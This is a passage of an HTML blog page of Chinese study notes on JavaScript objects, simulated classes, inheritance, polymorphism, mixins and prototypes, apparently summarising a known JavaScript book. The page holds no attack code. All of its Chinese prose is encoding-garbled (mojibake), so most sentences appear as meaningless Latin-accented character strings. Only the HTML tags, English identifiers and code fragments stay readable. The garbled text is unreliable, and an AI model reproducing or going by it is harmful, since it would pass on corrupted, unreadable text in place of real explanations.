å½¢å¼</strong>(æ¯”å¦‚ var a = new Array(..))ã€‚å­—é¢å½¢å¼æ›´å¸¸ç”¨ï¼Œä¸è¿‡æœ‰æ—¶å€™æ„é€ å½¢å¼å¯ä»¥æä¾›æ›´å¤šé€‰é¡¹ã€‚</li><li>å¯¹è±¡æ˜¯ 6 ä¸ªåŸºç¡€ç±»å‹ä¹‹ä¸€ã€‚å¯¹è±¡æœ‰åŒ…æ‹¬ function åœ¨å†…çš„å­ç±»å‹ï¼Œä¸åŒå­ç±»å‹å…·æœ‰ä¸åŒçš„è¡Œä¸ºï¼Œæ¯”å¦‚å†…éƒ¨æ ‡ç­¾ [object Array] è¡¨ç¤ºè¿™æ˜¯å¯¹è±¡çš„å­ç±»å‹æ•°ç»„ã€‚</li><li>å¯¹è±¡å°±æ˜¯é”® / å€¼å¯¹çš„é›†åˆã€‚å¯ä»¥é€šè¿‡ .propName æˆ–è€… [â€œpropNameâ€] è¯­æ³•æ¥è·å–å±æ€§å€¼ã€‚è®¿é—®å±æ€§æ—¶ï¼Œå¼•æ“å®é™…ä¸Šä¼šè°ƒç”¨å†…éƒ¨çš„é»˜è®¤ [[Get]] æ“ä½œ(åœ¨è®¾ç½®å±æ€§å€¼æ—¶æ˜¯ [[Put]])ï¼Œ [[Get]] æ“ä½œä¼šæ£€æŸ¥å¯¹è±¡æœ¬èº«æ˜¯å¦åŒ…å«è¿™ä¸ªå±æ€§ï¼Œå¦‚æœæ²¡æ‰¾åˆ°çš„è¯å®ƒè¿˜ä¼šæŸ¥æ‰¾ [[Prototype]] é“¾ã€‚</li><li>å±æ€§çš„ç‰¹æ€§å¯ä»¥é€šè¿‡å±æ€§æè¿°ç¬¦æ¥æ§åˆ¶ï¼Œæ¯”å¦‚ writable å’Œ configurableã€‚æ­¤å¤–ï¼Œå¯ä»¥ä½¿ç”¨ Object.preventExtensions(..)ã€Object.seal(..) å’Œ Object.freeze(..) æ¥è®¾ç½®å¯¹è±¡(åŠå…¶å±æ€§)çš„ä¸å¯å˜æ€§çº§åˆ«ã€‚</li><li>å±æ€§ä¸ä¸€å®šåŒ…å«å€¼â€”â€”å®ƒä»¬å¯èƒ½æ˜¯å…·å¤‡ getter/setter çš„â€œè®¿é—®æè¿°ç¬¦â€ã€‚æ­¤å¤–ï¼Œå±æ€§å¯ä»¥æ˜¯å¯æšä¸¾æˆ–è€…ä¸å¯æšä¸¾çš„ï¼Œè¿™å†³å®šäº†å®ƒä»¬æ˜¯å¦ä¼šå‡ºç°åœ¨ for..in å¾ªç¯ä¸­ã€‚</li><li>å¯ä»¥ä½¿ç”¨ ES6 çš„ for..of è¯­æ³•æ¥éå†æ•°æ®ç»“æ„(æ•°ç»„ã€å¯¹è±¡ï¼Œç­‰ç­‰)ä¸­çš„å€¼ï¼Œfor..of ä¼šå¯»æ‰¾å†…ç½®æˆ–è€…è‡ªå®šä¹‰çš„ @@iterator å¯¹è±¡å¹¶è°ƒç”¨å®ƒçš„ next() æ–¹æ³•æ¥éå†æ•°æ®å€¼ã€‚</li></ul><h2 id="ç¬¬å››ç« -æ··åˆå¯¹è±¡â€ç±»â€"><a href="#ç¬¬å››ç« -æ··åˆå¯¹è±¡â€ç±»â€" class="headerlink" title="ç¬¬å››ç«  æ··åˆå¯¹è±¡â€ç±»â€"></a>ç¬¬å››ç«  æ··åˆå¯¹è±¡â€ç±»â€</h2><h3 id="4-1-ç±»ç†è®º"><a href="#4-1-ç±»ç†è®º" class="headerlink" title="4.1 ç±»ç†è®º"></a>4.1 ç±»ç†è®º</h3><p>è¯´æ˜:</p><ul><li>ç±»å…¶æ˜¯æè¿°äº†ä¸€ç§ä»£ç çš„ç»„ç»‡ç»“æ„å½¢å¼.</li><li>åœ¨jsä¸­ç±»å¸¸è§çš„å°±æ˜¯æ„é€ å‡½æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯é€šè¿‡ES6æä¾›çš„classå…³é”®å­—ï¼›ç»§æ‰¿å°±æ˜¯å‡½æ•°ï¼›å®ä¾‹åŒ–å°±æ˜¯å¯¹è±¡ï¼Œå¸¸è§çš„å°±æ˜¯é€šè¿‡newæ„é€ å‡½æ•°å®ç°çš„ã€‚</li></ul><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b48db6fb628b%EF%BC%9Fw=1178&h=695&f=png&s=60553" alt="ç±»ã€ç»§æ‰¿å’Œå®ä¾‹åŒ–"></p><p><strong>æ³¨æ„:</strong> Javascriptè¯­è¨€ä¸æ”¯æŒâ€œç±»â€ï¼Œæ‰€è°“çš„â€ç±»â€ä¹Ÿæ˜¯æ¨¡æ‹Ÿå‡ºçš„â€œç±»â€ã€‚å³ä½¿æ˜¯ES6å¼•å…¥çš„â€ç±»â€å®è´¨ä¸Šä¹Ÿæ˜¯ JavaScript ç°æœ‰çš„åŸºäºåŸå‹çš„ç»§æ‰¿çš„è¯­æ³•ç³–ã€‚</p><h4 id="4-1-1-â€œç±»â€è®¾è®¡æ¨¡å¼"><a href="#4-1-1-â€œç±»â€è®¾è®¡æ¨¡å¼" class="headerlink" title="4.1.1 â€œç±»â€è®¾è®¡æ¨¡å¼"></a>4.1.1 <strong>â€œç±»â€è®¾è®¡æ¨¡å¼</strong></h4><p>ç±»å…¶å®ä¹Ÿæ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼</p><h4 id="4-1-2-JavaScriptä¸­çš„â€œç±»â€"><a href="#4-1-2-JavaScriptä¸­çš„â€œç±»â€" class="headerlink" title="4.1.2 JavaScriptä¸­çš„â€œç±»â€"></a>4.1.2 <strong>JavaScriptä¸­çš„â€œç±»â€</strong></h4><p>JavaScript åªæœ‰ä¸€äº›è¿‘ä¼¼ç±»çš„è¯­æ³•å…ƒç´  (æ¯”å¦‚ new å’Œ instanceof)ï¼Œä¸è¿‡åœ¨åæ¥çš„ ES6 ä¸­æ–°å¢äº†ä¸€äº›å…ƒç´ ï¼Œæ¯”å¦‚ class å…³é”®å­—ï¼Œå…¶å®è´¨ä¸Šä¹Ÿæ˜¯ JavaScript ç°æœ‰çš„åŸºäºåŸå‹çš„ç»§æ‰¿çš„è¯­æ³•ç³–ï¼Œä¹Ÿä¸æ˜¯çœŸæ­£çš„ç±»ã€‚</p><h3 id="4-2-ç±»çš„æœºåˆ¶"><a href="#4-2-ç±»çš„æœºåˆ¶" class="headerlink" title="4.2 ç±»çš„æœºåˆ¶"></a>4.2 <strong>ç±»çš„æœºåˆ¶</strong></h3><h4 id="4-2-1-å»ºé€ "><a href="#4-2-1-å»ºé€ " class="headerlink" title="4.2.1 å»ºé€ "></a>4.2.1 <strong>å»ºé€ </strong></h4><p>åœ¨JavaScripté‡Œâ€ç±»â€ä¸»è¦æ˜¯æ„é€ å‡½æ•°ï¼Œâ€å®ä¾‹â€å°±æ˜¯å¯¹è±¡ã€‚æ¦‚æ‹¬ä¸€ä¸‹ï¼š<strong>ç±»é€šè¿‡å®ä¾‹åŒ–å¾—åˆ°å®ä¾‹å¯¹è±¡</strong>ã€‚</p><p>æ€»è€Œè¨€ä¹‹:ç±»é€šè¿‡å®ä¾‹åŒ–å¾—åˆ°å®ä¾‹å¯¹è±¡.</p><h4 id="4-2-2-æ„é€ å‡½æ•°"><a href="#4-2-2-æ„é€ å‡½æ•°" class="headerlink" title="4.2.2 æ„é€ å‡½æ•°"></a>4.2.2 <strong>æ„é€ å‡½æ•°</strong></h4><ul><li>ç±»å®ä¾‹æ˜¯ç”±ä¸€ä¸ªç‰¹æ®Šçš„ç±»æ–¹æ³•æ„é€ çš„ï¼Œè¿™ä¸ªæ–¹æ³•åé€šå¸¸å’Œç±»åç›¸åŒï¼Œè¢«ç§°ä¸ºæ„é€ å‡½æ•°ã€‚</li><li>å®ä¾‹å°±æ˜¯ç”±æ„é€ å‡½æ•°å®ä¾‹åŒ–çš„: new æ„é€ å‡½æ•°ã€‚</li><li>æ„é€ å‡½æ•°å¤§å¤šéœ€è¦ç”¨ new æ¥è°ƒï¼Œè¿™æ ·è¯­è¨€å¼•æ“æ‰çŸ¥é“ä½ æƒ³è¦æ„é€ ä¸€ä¸ªæ–°çš„ç±»å®ä¾‹ã€‚</li><li>æ„é€ å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯å®ä¾‹ã€‚å®ä¾‹å¯ä»¥è°ƒç”¨ç±»çš„æ–¹æ³•ã€‚</li></ul><h3 id="4-3-ç±»çš„ç»§æ‰¿"><a href="#4-3-ç±»çš„ç»§æ‰¿" class="headerlink" title="4.3 ç±»çš„ç»§æ‰¿"></a>4.3 ç±»çš„ç»§æ‰¿</h3><p>åœ¨é¢å‘ç±»çš„è¯­è¨€ä¸­ï¼Œä½ å¯ä»¥å…ˆå®šä¹‰ä¸€ä¸ªç±»ï¼Œç„¶åå®šä¹‰ä¸€ä¸ªç»§æ‰¿å‰è€…çš„ç±»ã€‚åè€…é€šå¸¸è¢«ç§°ä¸ºâ€œå­ç±»â€ï¼Œå‰è€…é€šå¸¸è¢«ç§°ä¸ºâ€œçˆ¶ç±»â€ã€‚å­ç±»å¯ä»¥ç»§æ‰¿çˆ¶ç±»çš„è¡Œä¸ºï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚ï¼Œä¿®æ”¹ç»§æ‰¿çš„è¡Œä¸º(ä¸€èˆ¬å¹¶ä¸ä¼šä¿®æ”¹çˆ¶ç±»çš„è¡Œä¸º).æ³¨æ„:æˆ‘ä»¬è®¨è®ºçš„çˆ¶ç±»å’Œå­ç±»å¹¶ä¸æ˜¯å®ä¾‹ï¼Œåœ¨JavaScripté‡Œç±»ä¸€èˆ¬éƒ½æ˜¯æ„é€ å‡½æ•°ã€‚</p><h4 id="4-3-1-å¤šæ€"><a href="#4-3-1-å¤šæ€" class="headerlink" title="4.3.1 å¤šæ€"></a>4.3.1 <strong>å¤šæ€</strong></h4><ul><li><strong>ç›¸å¯¹æ€§:</strong> å…¶å®ç›¸å¯¹æ€§å°±æ˜¯å­ç±»ç›¸å¯¹äºçˆ¶ç±»çš„å¼•ç”¨(ä¾‹å¦‚ä½¿ç”¨superå®ç°å¼•ç”¨)ï¼Œå¹¶ä¸”å­ç±»å¯¹çˆ¶ç±»çš„å¼•ç”¨å¹¶ä¸ä¼šå¯¹çˆ¶ç±»çš„è¡Œä¸ºé€ æˆä»»ä½•å½±å“(å¹¶ä¸ä¼šå¯¹çˆ¶ç±»<strong>è‡ªèº«</strong>çš„è¡Œä¸ºè¿›è¡Œé‡æ–°å®šä¹‰)ï¼Œä¾‹å¦‚ä¹¦ä¸­ä¾‹å­å­ç±»å¯¹drive()çš„å¼•ç”¨ã€‚</li><li><strong>å¯é‡å¤å®šä¹‰:</strong> å­ç±»ç»§æ‰¿çˆ¶ç±»çš„æŸä¸ªæ–¹æ³•ï¼Œå¹¶å¯ä»¥å¯¹è¿™ä¸ªæ–¹æ³•è¿›è¡Œå†æ¬¡å®šä¹‰ï¼Œä¾‹å¦‚ä¹¦ä¸­å­ç±»å¯¹drive()ä¸­çš„outputè¿›è¡Œä¿®æ”¹ã€‚å½“è°ƒç”¨æ–¹æ³•æ—¶ä¼šè‡ªåŠ¨é€‰æ‹©åˆé€‚çš„å®šä¹‰ã€‚</li></ul><p><strong>è¯´æ˜:</strong> </p><ul><li>åœ¨ JavaScript ä¸­â€œç±»â€æ˜¯å±äºæ„é€ å‡½æ•°çš„(ç±»ä¼¼ Foo.prototypeâ€¦ è¿™æ ·çš„ç±»å‹å¼•ç”¨)ã€‚ç”±äº JavaScriptä¸­<strong>çˆ¶ç±»å’Œå­ç±»çš„å…³ç³»åªå­˜åœ¨äºä¸¤è€…æ„é€ å‡½æ•°å¯¹åº”çš„ .prototype å¯¹è±¡ä¸­</strong>ï¼Œå› æ­¤å®ƒä»¬çš„æ„é€ å‡½æ•°ä¹‹é—´å¹¶ä¸å­˜åœ¨ç›´æ¥è”ç³»ï¼Œä»è€Œæ— æ³•ç®€å•åœ°å®ç°ä¸¤è€…çš„ç›¸å¯¹å¼•ç”¨(åœ¨ ES6 çš„ç±»ä¸­å¯ä»¥é€šè¿‡ superæ¥â€œè§£å†³â€è¿™ä¸ªé—®é¢˜ï¼Œå‚è§é™„å½• A)ã€‚</li><li><strong>å¤šæ€å¹¶ä¸è¡¨ç¤ºå­ç±»å’Œçˆ¶ç±»æœ‰å…³è”ï¼Œå­ç±»å¾—åˆ°çš„åªæ˜¯çˆ¶ç±»çš„ä¸€ä»½å‰¯æœ¬ã€‚ç±»çš„ç»§æ‰¿å…¶å®å°±æ˜¯å¤åˆ¶ã€‚</strong></li></ul><h4 id="4-3-2-å¤šé‡ç»§æ‰¿"><a href="#4-3-2-å¤šé‡ç»§æ‰¿" class="headerlink" title="4.3.2 å¤šé‡ç»§æ‰¿"></a>4.3.2 <strong>å¤šé‡ç»§æ‰¿</strong></h4><p><strong>å¤šé‡ç»§æ‰¿:</strong> ä¸€ä¸ªå­ç±»å¯ä»¥ç»§æ‰¿æ¥è‡ªå¤šä¸ªçˆ¶ç±»çš„æ–¹æ³•ã€‚<br><strong>å¤šé‡ç»§æ‰¿å¼•å‘çš„é—®é¢˜:</strong> å¤šé‡ç»§æ‰¿å¯èƒ½ä¼šå‡ºç°ï¼Œå¤šä¸ªçˆ¶ç±»ä¸­æ–¹æ³•åå†²çªçš„é—®é¢˜ï¼Œè¿™æ ·<code>å­ç±»</code>åˆ°åº•å¼•ç”¨å“ªä¸ªæ–¹æ³•ï¼Ÿ     <strong>å¤šé‡ç»§æ‰¿ä¸JavaScript:</strong> JavaScriptæœ¬èº«å¹¶æ²¡æœ‰æä¾›å¤šé‡ç»§æ‰¿åŠŸèƒ½.ä½†å®ƒå¯ä»¥é€šè¿‡å…¶ä»–æ–¹æ³•æ¥è¾¾åˆ°å¤šé‡ç»§æ‰¿çš„æ•ˆæœ.</p><h3 id="4-4-æ··å…¥"><a href="#4-4-æ··å…¥" class="headerlink" title="4.4 æ··å…¥"></a>4.4 <strong>æ··å…¥</strong></h3><p>JavaScript ä¸­åªæœ‰å¯¹è±¡ï¼Œå¹¶ä¸å­˜åœ¨å¯ä»¥è¢«å®ä¾‹åŒ–çš„â€œç±»â€ã€‚ä¸€ä¸ªå¯¹è±¡å¹¶ä¸ä¼šè¢«å¤åˆ¶åˆ°å…¶ä»–å¯¹è±¡ï¼Œå®ƒä»¬ä¼šè¢«å…³è”èµ·æ¥(å‚è§ç¬¬ 5 ç« )(å…¶å®å°±æ˜¯å¼•ç”¨ï¼Œæ‰€ä»¥å®ƒçš„å¤šæ€æ˜¯â€ç›¸å¯¹â€çš„)ã€‚<br>ç”±äºåœ¨å…¶ä»–è¯­è¨€ä¸­ç±»è¡¨ç°å‡ºæ¥çš„éƒ½æ˜¯å¤åˆ¶è¡Œä¸ºï¼Œå› æ­¤ JavaScript å¼€å‘è€…ä¹Ÿæƒ³å‡ºäº†ä¸€ä¸ªæ–¹æ³•æ¥æ¨¡æ‹Ÿç±»çš„å¤åˆ¶è¡Œä¸ºï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯æ··å…¥(<strong>é€šè¿‡æ··å…¥æ¥æ¨¡æ‹Ÿå®ç°ç±»çš„å¤šé‡ç»§æ‰¿</strong>)ã€‚</p><h4 id="4-4-1-æ˜¾å¼æ··å…¥"><a href="#4-4-1-æ˜¾å¼æ··å…¥" class="headerlink" title="4.4.1 æ˜¾å¼æ··å…¥"></a>4.4.1 <strong>æ˜¾å¼æ··å…¥</strong></h4><p><strong>éƒ‘é‡æé†’:</strong>     ä¹¦ä¸­è¿™é‡Œçš„ç±»éƒ½æ˜¯å¯¹è±¡å½¢å¼çš„.ä¾‹å­é‡Œçš„sourceObjï¼Œ targetObjï¼Œè¿™å°±å¯èƒ½é€ æˆä¸€ä¸ªâ€è¯¯å¯¼â€ï¼Œåœ¨JavaScripté‡Œæ˜¯<strong>æ²¡æœ‰çœŸæ­£çš„ç±»</strong>ï¼Œæ‰€è°“çš„ç±»ä¹Ÿä¸è¿‡æ˜¯æˆ‘ä»¬æ¨¡æ‹Ÿå‡ºæ¥çš„â€ç±»â€ï¼Œä¸è¿‡æ˜¯ä¸€ç§è¯­æ³•ç³–(åŒ…æ‹¬ES6é‡Œçš„class)ã€‚åœ¨JavaScripté‡Œâ€æ‰€è°“çš„ç±»â€ç»å¸¸æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œä½ å¹¶ä¸èƒ½è¿™æ ·è¿›è¡Œéå†ï¼Œåªèƒ½å¯¹å®ƒçš„å®ä¾‹å¯¹è±¡è¿›è¡Œè¿™ç§æ“ä½œã€‚</p><p><strong>æ˜¾å¼æ··å…¥:</strong>  æ˜¾å¼æ··å…¥å°±æ˜¯é€šè¿‡ç±»ä¼¼mixin()æ–¹æ³•ï¼Œæ˜¾å¼åœ°å°†çˆ¶å¯¹è±¡å±æ€§é€ä¸€å¤åˆ¶ï¼Œæˆ–è€…æœ‰é€‰æ‹©åœ°å¤åˆ¶åˆ°å­å¯¹è±¡ä¸Šã€‚          </p><p><strong>æ˜¾å¼æ··å…¥å¸¸ç”¨æ–¹æ³•:</strong> é¦–å…ˆæœ‰å­å¯¹è±¡ï¼Œå¹¶å¯¹å…¶è¿›è¡Œç‰¹æ®ŠåŒ–(å®šä¹‰è‡ªå·±çš„å±æ€§æˆ–æ–¹æ³•)ã€‚ç„¶åå†é€šè¿‡mixin()æ–¹æ³•å°†çˆ¶å¯¹è±¡æœ‰é€‰æ‹©åœ°å¤åˆ¶(å³å­˜åœ¨æ€§æ£€æŸ¥ï¼Œè¿‡æ»¤å­å¯¹è±¡å·²æœ‰çš„å±æ€§ï¼Œé¿å…å†²çª)åˆ°å­å¯¹è±¡ä¸Šã€‚</p><p><strong>æ˜¾å¼æ··å…¥æ³¨æ„ç‚¹:<strong>æ˜¾å¼æ··å…¥æ—¶ï¼Œåˆ‡è®°ä¸€ç‚¹ä½ è¦</strong>é¿å…çˆ¶å¯¹è±¡çš„å±æ€§ä¸å­å¯¹è±¡ç‰¹æ®ŠåŒ–çš„å±æ€§å†²çª</strong>ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¾‹å­ä¸­è¦è¿›è¡Œå­˜åœ¨æ€§æ£€æŸ¥ï¼Œä»¥åŠåé¢è¦è¯´çš„æ··åˆå¤åˆ¶ï¼Œå¯èƒ½å­˜åœ¨çš„é‡å†™é£é™©.</p><p><strong>1. å†è¯´å¤šæ€</strong><br><strong>æ˜¾å¼å¤šæ€:</strong> å°†çˆ¶å¯¹è±¡é‡Œçš„æ–¹æ³•é€šè¿‡æ˜¾å¼ç»‘å®šåˆ°å­å¯¹è±¡ä¸Šï¼Œå°±æ˜¯æ˜¾å¼å¤šæ€ã€‚ä¾‹å¦‚ä¹¦ä¸­çš„ä¾‹å­:Vehicle.drive.call( this )ã€‚<strong>æ˜¾å¼å¤šæ€ä¹Ÿæ˜¯ä¸ºäº†JSæ¥æ¨¡æ‹Ÿå®ç°å¤šé‡ç»§æ‰¿çš„ï¼</strong><br><strong>è¯´æ˜:</strong> åœ¨ES6ä¹‹å‰æ˜¯æ²¡æœ‰ç›¸å¯¹å¤šæ€çš„æœºåˆ¶ã€‚æ‰€ä»¥å°±ä½¿ç”¨callè¿™ç§è¿›è¡Œæ˜¾å¼ç»‘å®šå®ç°æ˜¾å¼åŠ¨æ€ã€‚æ³¨æ„JavaScripté‡Œå®ç°å¤šæ€çš„æ–¹æ³•ä¹Ÿè¢«ç§°ä¸ºâ€ä¼ªå¤šæ€â€ï¼Œæ‰€ä»¥ä¸è¦å¯¹åé¢çªç„¶å†’å‡ºçš„ä¼ªå¤šæ€æ¦‚å¿µè€Œä¸€è„¸æ‡µé€¼ã€‚</p><p><strong>æ˜¾å¼å¤šæ€(ä¼ªå¤šæ€)çš„ç¼ºé™·:</strong> å› ä¸ºåœ¨JavaScript ä¸­å­˜åœ¨å±è”½(å®é™…æ˜¯å‡½æ•°å¼•ç”¨çš„ä¸Šä¸‹æ–‡ä¸åŒ)ï¼Œæ‰€ä»¥åœ¨å¼•ç”¨çš„æ—¶å€™å°±éœ€è¦ä½¿ç”¨æ˜¾å¼ä¼ªå¤šæ€çš„æ–¹æ³•åˆ›å»ºä¸€ä¸ªå‡½æ•°å…³è”.   è¿™äº›éƒ½ä¼šå¢åŠ ä»£ç çš„å¤æ‚åº¦å’Œç»´æŠ¤éš¾åº¦ã€‚</p><p><strong>2. æ··åˆå¤åˆ¶</strong>(æ˜¾å¼æ··å…¥å¦ä¸€ç§ä¸å¸¸ç”¨æ–¹æ³•)<br>å‰é¢çš„æ˜¾å¼æ··å…¥çš„æ–¹æ³•æ˜¯å…ˆæœ‰å­å¯¹è±¡å¹¶è¿›è¡Œç‰¹æ®ŠåŒ–ï¼Œç„¶åå†æœ‰é€‰æ‹©åœ°å¤åˆ¶çˆ¶å¯¹è±¡å±æ€§ã€‚è¿™ä¸ªä¸å¸¸ç”¨çš„æ–¹æ³•åˆ™æ˜¯åè¿‡æ¥çš„ï¼Œç»“åˆä¹¦ä¸­ä¾‹å­ï¼Œå®ƒå…ˆç”¨ä¸€ä¸ªç©ºå¯¹è±¡<strong>å®Œå…¨å¤åˆ¶</strong>çˆ¶å¯¹è±¡çš„å±æ€§ï¼Œç„¶åè¯¥å¯¹è±¡å¤åˆ¶ç‰¹æ®ŠåŒ–å¯¹è±¡çš„å±æ€§ï¼Œæœ€åå¾—åˆ°å­å¯¹è±¡ã€‚è¿™ç§æ–¹æ³•æ˜æ˜¾æ˜¯æ¯”ç¬¬ä¸€ç§éº»çƒ¦çš„ï¼Œå¹¶ä¸”åœ¨å¤åˆ¶ç‰¹æ®ŠåŒ–å¯¹è±¡æ—¶ï¼Œå¯èƒ½ä¼šå¯¹ä¹‹å‰é‡åçš„å±æ€§(å³å¤åˆ¶å¾—åˆ°çš„çˆ¶å¯¹è±¡å±æ€§)è¿›è¡Œé‡å†™è¦†ç›–ã€‚æ‰€ä»¥è¿™ç§æ–¹æ³•æ˜¯å­˜åœ¨é£é™©ï¼Œä¸”æ•ˆç‡ä½ä¸‹çš„.</p><p><strong>æ˜¾å¼æ··å…¥çš„ç¼ºé™·:</strong></p><ul><li><strong>æ— æ³•åšåˆ°çœŸæ­£çš„å¤åˆ¶:</strong> å¦‚æœå¤åˆ¶çš„å¯¹è±¡ä¸­å­˜åœ¨å¯¹å‡½æ•°çš„å¼•ç”¨ï¼Œé‚£ä¹ˆå­å¯¹è±¡å¾—åˆ°çš„æ˜¯å’Œçˆ¶å¯¹è±¡ä¸€æ ·çš„ï¼Œå¯¹åŒä¸€ä¸ªå‡½æ•°çš„å¼•ç”¨ã€‚å¦‚æœæŸä¸ªå­å¯¹è±¡å¯¹å‡½æ•°è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆçˆ¶å¯¹è±¡åŠå…¶ä»–å­å¯¹è±¡éƒ½ä¼šå—åˆ°å½±å“ï¼Œå¾ˆæ˜æ˜¾è¿™æ˜¯ä¸å®‰å…¨çš„ï¼ŒåŸå› æ˜¯JavaScript ä¸­çš„å‡½æ•°æ— æ³•è¿›è¡ŒçœŸæ­£åœ°å¤åˆ¶ï¼Œä½ åªèƒ½å¤åˆ¶å¯¹å…±äº«å‡½æ•°å¯¹è±¡çš„å¼•ç”¨.</li><li><strong>å‡½æ•°åå’Œå±æ€§ååŒå:</strong> å¦‚æœæ··å…¥å¤šä¸ªå¯¹è±¡ï¼Œåˆ™å¯èƒ½ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚ç›®å‰ç°åœ¨ä»æ²¡æœ‰æ¯”è¾ƒå¥½çš„æ–¹å¼æ¥å¤„ç†å‡½æ•°å’Œå±æ€§çš„åŒåé—®é¢˜ã€‚</li></ul><p><strong>3. å¯„ç”Ÿç»§æ‰¿</strong><br>æ˜¾å¼æ··å…¥æ¨¡å¼çš„ä¸€ç§å˜ä½“è¢«ç§°ä¸ºâ€œå¯„ç”Ÿç»§æ‰¿â€ï¼Œå®ƒæ—¢æ˜¯æ˜¾å¼çš„åˆæ˜¯éšå¼çš„ã€‚é¦–å…ˆä¼šå¤åˆ¶ä¸€ä»½çˆ¶ç±»(å¯¹è±¡)çš„å®šä¹‰ï¼Œç„¶åæ··å…¥å­ç±»(å¯¹è±¡)çš„å®šä¹‰(å¦‚æœéœ€è¦çš„è¯ä¿ç•™åˆ°çˆ¶ç±»çš„ç‰¹æ®Šå¼•ç”¨)ï¼Œç„¶åç”¨è¿™ä¸ªå¤åˆå¯¹è±¡æ„å»ºå®ä¾‹ã€‚<br><strong>è¯´æ˜:</strong> å¯„ç”Ÿç»§æ‰¿ä¸æ··åˆå¤åˆ¶æ˜¯å¾ˆç›¸ä¼¼çš„ï¼Œæœ€å¤§çš„åŒºåˆ«æ˜¯å¯„ç”Ÿç»§æ‰¿æ˜¯é€šè¿‡å®ä¾‹åŒ–æ„é€ å‡½æ•°(JSä¸­çš„â€ç±»â€)æ¥å®ç°å¤åˆ¶çš„.</p><h4 id="4-4-2-éšå¼æ··å…¥"><a href="#4-4-2-éšå¼æ··å…¥" class="headerlink" title="4.4.2 éšå¼æ··å…¥"></a>4.4.2 <strong>éšå¼æ··å…¥</strong></h4><p><strong>éšå¼æ··å…¥:</strong> å®ƒä¸æ˜¾ç¤ºæ··å…¥æœ€å¤§çš„åŒºåˆ«ï¼Œå°±æ˜¯å®ƒæ²¡æœ‰æ˜æ˜¾çš„å¯¹çˆ¶ç±»(å¯¹è±¡)å±æ€§è¿›è¡Œå¤åˆ¶çš„è¿‡ç¨‹ã€‚å®ƒæ˜¯é€šè¿‡åœ¨æ„é€ å‡½æ•°è°ƒç”¨æˆ–è€…æ–¹æ³•è°ƒç”¨ä¸­ä½¿ç”¨æ˜¾å¼ç»‘å®šä¾‹å¦‚: Something.cool.call( this)æ¥å®ç°æ··å…¥(å¤šé‡ç»§æ‰¿)ï¼Œå…¶æœ¬è´¨å°±æ˜¯é€šè¿‡æ”¹å˜thisæŒ‡å‘æ¥å®ç°æ··å…¥ã€‚</p><h3 id="4-5-å°ç»“"><a href="#4-5-å°ç»“" class="headerlink" title="4.5 å°ç»“"></a>4.5 <strong>å°ç»“</strong></h3><p><strong>é‡ç‚¹:</strong></p><ul><li><strong>ç±»æ„å‘³ç€å¤åˆ¶ï¼</strong></li><li>ä¼ ç»Ÿçš„ç±»è¢«å®ä¾‹åŒ–æ—¶ï¼Œå®ƒçš„è¡Œä¸ºä¼šè¢«å¤åˆ¶åˆ°å®ä¾‹ä¸­ã€‚ç±»è¢«ç»§æ‰¿æ—¶ï¼Œè¡Œä¸ºä¹Ÿä¼šè¢«å¤åˆ¶åˆ°å­ç±»ä¸­ã€‚</li><li>å¤šæ€(åœ¨ç»§æ‰¿é“¾çš„ä¸åŒå±‚æ¬¡åç§°ç›¸åŒä½†æ˜¯åŠŸèƒ½ä¸åŒçš„å‡½æ•°)çœ‹èµ·æ¥ä¼¼ä¹æ˜¯ä»å­ç±»å¼•ç”¨çˆ¶ç±»ï¼Œä½†æ˜¯æœ¬è´¨ä¸Šå¼•ç”¨çš„å…¶å®æ˜¯å¤åˆ¶çš„ç»“æœã€‚</li><li>JavaScript å¹¶ä¸ä¼š(åƒç±»é‚£æ ·)è‡ªåŠ¨åˆ›å»ºå¯¹è±¡çš„å‰¯æœ¬ã€‚</li><li><strong>æ··å…¥æ¨¡å¼(æ— è®ºæ˜¾å¼è¿˜æ˜¯éšå¼)å¯ä»¥ç”¨æ¥æ¨¡æ‹Ÿç±»çš„å¤åˆ¶è¡Œä¸º</strong>ï¼Œä½†æ˜¯é€šå¸¸ä¼šäº§ç”Ÿä¸‘é™‹å¹¶ä¸”è„†å¼±çš„è¯­æ³•ï¼Œæ¯”å¦‚æ˜¾å¼ä¼ªå¤šæ€(OtherObj.methodName.call(thisï¼Œ â€¦))ï¼Œè¿™ä¼šè®©ä»£ç æ›´åŠ éš¾æ‡‚å¹¶ä¸”éš¾ä»¥ç»´æŠ¤ã€‚</li><li>æ˜¾å¼æ··å…¥å®é™…ä¸Šæ— æ³•å®Œå…¨æ¨¡æ‹Ÿç±»çš„å¤åˆ¶è¡Œä¸ºï¼Œå› ä¸ºå¯¹è±¡(å’Œå‡½æ•°ï¼åˆ«å¿˜äº†å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡)åªèƒ½å¤åˆ¶å¼•ç”¨ï¼Œæ— æ³•å¤åˆ¶è¢«å¼•ç”¨çš„å¯¹è±¡æˆ–è€…å‡½æ•°æœ¬èº«ã€‚</li><li>åœ¨ JavaScript ä¸­æ¨¡æ‹Ÿç±»æ˜¯å¾—ä¸å¿å¤±çš„ï¼Œè™½ç„¶èƒ½è§£å†³å½“å‰çš„é—®é¢˜ï¼Œä½†æ˜¯å¯èƒ½ä¼šåŸ‹ä¸‹æ›´å¤šçš„éšæ‚£ã€‚</li></ul><h2 id="ç¬¬äº”ç« -åŸå‹"><a href="#ç¬¬äº”ç« -åŸå‹" class="headerlink" title="ç¬¬äº”ç«  åŸå‹"></a>ç¬¬äº”ç«  åŸå‹</h2><h3 id="5-1-Prototype"><a href="#5-1-Prototype" class="headerlink" title="5.1 [[Prototype]]"></a>5.1 <code>[[Prototype]]</code></h3><p>JavaScript ä¸­çš„å¯¹è±¡æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ [[Prototype]] å†…ç½®å±æ€§ï¼Œå…¶å®å°±æ˜¯å¯¹äºå…¶ä»–å¯¹è±¡çš„å¼•ç”¨ã€‚å‡ 